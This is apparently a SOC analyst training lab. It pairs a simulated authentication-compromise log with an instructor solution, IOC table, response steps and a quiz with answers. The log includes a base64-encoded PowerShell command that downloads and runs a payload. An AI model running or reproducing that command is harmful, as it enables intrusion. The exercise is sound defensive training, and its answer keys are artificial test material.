# Final Practical End-to-End SOC Investigation

Lab Title: "PIET [Panipat Institute of Engineering & Technology] Authentication Incident"
Objective
Perform a complete end-to-end SOC investigation, from alert to report.

Scenario
PIET [Panipat Institute of Engineering & Technology]'s SIEM has generated multiple alerts. You must investigate all alerts, determine whether an incident occurred, and produce a complete investigation report.

Dataset
text
[2024-11-15 09:22:00] Firewall: Port scan from 203.0.113.45 to WS-FINANCE-01
[2024-11-15 09:23:01] Security: 4625 | jsmith | 203.0.113.45 | 10 | Bad password
[2024-11-15 09:23:05] Security: 4625 | jsmith | 203.0.113.45 | 10 | Bad password
[2024-11-15 09:23:10] Security: 4625 | jsmith | 203.0.113.45 | 10 | Bad password
[2024-11-15 09:23:15] Security: 4625 | jsmith | 203.0.113.45 | 10 | Bad password
[2024-11-15 09:23:20] Security: 4625 | jsmith | 203.0.113.45 | 10 | Bad password
[2024-11-15 09:23:25] Security: 4625 | jsmith | 203.0.113.45 | 10 | Bad password
[2024-11-15 09:23:30] Security: 4625 | jsmith | 203.0.113.45 | 10 | Bad password
[2024-11-15 09:23:35] Security: 4625 | jsmith | 203.0.113.45 | 10 | Bad password
[2024-11-15 09:23:40] Security: 4625 | jsmith | 203.0.113.45 | 10 | Bad password
[2024-11-15 09:23:45] Security: 4625 | jsmith | 203.0.113.45 | 10 | Bad password
[2024-11-15 09:23:50] Security: 4625 | jsmith | 203.0.113.45 | 10 | Bad password
[2024-11-15 09:28:15] Security: 4624 | jsmith | 203.0.113.45 | 10 | N/A
[2024-11-15 09:29:00] Security: 4688 | jsmith | powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACcAKQA=
[2024-11-15 09:29:15] Security: 4688 | jsmith | C:\Users\jsmith\AppData\Local\Temp\payload.exe
[2024-11-15 09:29:30] Firewall: Connection from WS-FINANCE-01 to 203.0.113.100 port 4444
[2024-11-15 09:30:00] Security: 4698 | jsmith | Scheduled task created: "WindowsUpdate"
[2024-11-15 09:30:15] Security: 4672 | jsmith | Special privileges assigned
[2024-11-15 09:30:30] Security: 4720 | SYSTEM | New user account created: "support_admin"
[2024-11-15 09:31:00] Security: 4728 | SYSTEM | support_admin added to Domain Admins
[2024-11-15 09:35:00] Security: 4624 | support_admin | 203.0.113.45 | 10 | N/A
Student Task
Produce a complete investigation report with the following sections:

Alert Summary – What alerts were received?

Investigation Summary – What did you investigate?

Evidence – What evidence did you find?

Timeline – Reconstruct the complete timeline

IOC Table – Extract all IOCs

Classification – How do you classify this incident?

Severity – What is the severity?

Confidence – What is your confidence level?

Scope – What is the scope of the incident?

Recommendations – What containment, eradication, and recovery actions do you recommend?

Final Conclusion – Your overall assessment

Instructor Solution
Alert Summary:

Multiple alerts were generated:

Multiple failed logins (brute force attempt)

Successful login from external IP

Suspicious process execution (PowerShell with encoded command)

Malware execution from Temp folder

C2 network connection

Scheduled task creation (persistence)

Privilege escalation

New user account creation

New admin user login

Investigation Summary:

The investigation revealed a complete attack chain:

Attacker performed brute force against jsmith account

Attacker successfully logged in as jsmith

Attacker used PowerShell with encoded command to download and execute malware

Malware established C2 connection

Attacker created scheduled task for persistence

Attacker escalated privileges

Attacker created new admin account

Attacker logged in as new admin account

Timeline:

Time	Event	Interpretation
09:22:00	Port scan	Reconnaissance
09:23:01-09:23:50	10 failed logins	Brute force
09:28:15	Successful login	Attacker access
09:29:00	PowerShell encoded command	Execution
09:29:15	payload.exe executed	Malware deployment
09:29:30	C2 connection	C2 communication
09:30:00	Scheduled task	Persistence
09:30:15	Special privileges	Privilege escalation
09:30:30	support_admin created	Account creation
09:31:00	support_admin added to Domain Admins	Privilege escalation
09:35:00	support_admin login	Attacker access as admin
IOC Table:

Type	Value	Confidence
IP	203.0.113.45	High
IP	203.0.113.100	High
User	jsmith	High
User	support_admin	High
Hash	(payload.exe hash from analysis)	High
File	C:\Users\jsmith\AppData\Local\Temp\payload.exe	High
Classification: Critical Incident

Severity: Critical

Confidence: High

Scope: WS-FINANCE-01 compromised; domain administrator access achieved; entire domain potentially compromised

Recommendations:

Containment:

Isolate WS-FINANCE-01 immediately

Disable jsmith and support_admin accounts

Block IPs 203.0.113.45 and 203.0.113.100

Reset all domain admin passwords

Eradication:

Remove payload.exe and related files

Remove scheduled task "WindowsUpdate"

Remove support_admin account

Reimage WS-FINANCE-01

Recovery:

Restore from clean backups if needed

Implement enhanced monitoring

Review and strengthen authentication policies

Final Conclusion:

This is a confirmed critical security incident. A successful brute-force attack led to full domain compromise. Immediate incident response is required. The attack involved multiple stages including initial access, execution, persistence, privilege escalation, and lateral movement preparation.

DAY 1 SUMMARY
Skills Acquired
SOC operations understanding

L1 analyst workflow

Windows event log analysis

Authentication attack detection

SIEM (Wazuh) investigation

IOC extraction and enrichment

Alert correlation

Timeline reconstruction

Incident triage and response

Tools Used
Tool	Purpose
Event Viewer	Windows log analysis
Wazuh Dashboard	SIEM investigation
VirusTotal	IOC enrichment
AbuseIPDB	IP reputation
AlienVault OTX	Threat intelligence
Important Event IDs
ID	Event
4624	Successful logon
4625	Failed logon
4634	Logoff
4648	Explicit credentials
4672	Special privileges
4688	Process creation
4698	Scheduled task created
4720	User account created
Day 1 Assessment
Multiple Choice Questions
What is a SIEM?
a) A firewall
b) A security monitoring and alerting platform
c) An antivirus
d) A password manager

Answer: b

Which event ID indicates a successful login?
a) 4625
b) 4624
c) 4688
d) 4698

Answer: b

What is the difference between brute force and password spraying?
a) Brute force uses multiple passwords against one account; password spraying uses one password against multiple accounts
b) Brute force is faster than password spraying
c) Password spraying uses more passwords
d) There is no difference

Answer: a

Short Answer Questions
What is an IOC? Provide three examples.

Answer: An Indicator of Compromise is evidence that suggests a system may be compromised. Examples: IP address, file hash, domain name.

Explain the L1 analyst workflow.

Answer: Alert → Validation → Triage → Context Gathering → Investigation → Severity Assessment → Escalation → Documentation

What is the purpose of alert correlation?

Answer: To connect related alerts and identify the complete attack story.

Scenario-Based Questions
You see 50 failed logins for the same account from the same IP in 5 minutes. What type of attack is this?

Answer: Brute force attack

After the failed logins, you see a successful login from the same IP. What does this indicate?

Answer: The attacker successfully guessed the password and gained access.

What should you do as an L1 analyst upon discovering a compromised account?

Answer: Disable the account, isolate affected systems, escalate to L2/incident response team, document findings.

